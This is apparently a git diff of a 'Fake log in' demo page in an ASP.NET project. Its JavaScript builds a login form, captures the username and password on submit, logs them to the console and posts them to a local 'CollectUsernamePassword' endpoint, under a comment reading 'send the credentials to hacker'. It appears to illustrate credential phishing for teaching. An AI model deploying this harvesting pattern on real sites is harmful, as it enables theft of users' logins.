@@ -6,32 +6,7 @@
 <h2>Fake log in - Log in</h2>
 <div class="row">
     <div id="dem" class="col-lg-6 col-lg-offset-0">
-        @*@using (Html.BeginForm("Index", "FakeLogin", FormMethod.Post, new { @class = "well", @id = "loginForm" }))
-        {
-            <div>
-                @Html.LabelFor(m => m.Username)
-            </div>
-            <div>
-                @Html.TextBoxFor(m => m.Username, new { @class = "form-control", @id = "usernameInput" })
-            </div>
-            <div>
-                @Html.ValidationMessageFor(m => m.Username, "", new { @class = "error-message" })
-            </div>
-
-            <div>
-                @Html.LabelFor(m => m.Password)
-            </div>
-            <div>
-                @Html.PasswordFor(m => m.Password, new { @class = "form-control", @id = "passwordInput" })
-            </div>
-            <div>
-                @Html.ValidationMessageFor(m => m.Password, "", new { @class = "error-message" })
-            </div>
-            <div>
-                <br />
-                <input type="submit" value="Log in" class="btn btn-primary" />
-            </div>
-        }*@
+        @* form goes here *@
     </div>
 </div>
 <div>
@@ -72,7 +47,8 @@
     loginButton.setAttribute("value", "Log in");
     loginButton.setAttribute("id", "loginInput");
     loginButton.setAttribute("class", "btn btn-primary");
-    
+
+    //append child elements
     colDiv.appendChild(loginForm);
     loginForm.appendChild(usernameLabel);
     loginForm.appendChild(usernameInput);
@@ -82,6 +58,7 @@
     loginForm.appendChild(document.createElement("br"));
     loginForm.appendChild(loginButton);
 
+    // add event listener to submit button
     loginForm.addEventListener("submit", function (e) {
         e.preventDefault();
         e.stopPropagation();
@@ -89,8 +66,10 @@
         var username = document.getElementById("usernameInput").value
         var password = document.getElementById("passwordInput").value
 
+        //press f12 to see the logged result
         console.log("Username: " + username + " Password: " + password);
 
+        // send the credentials to hacker
         var xhr = new XMLHttpRequest();
         xhr.open('POST', 'http://localhost:' + window.location.port + '/API/CollectUsernamePassword');
         xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
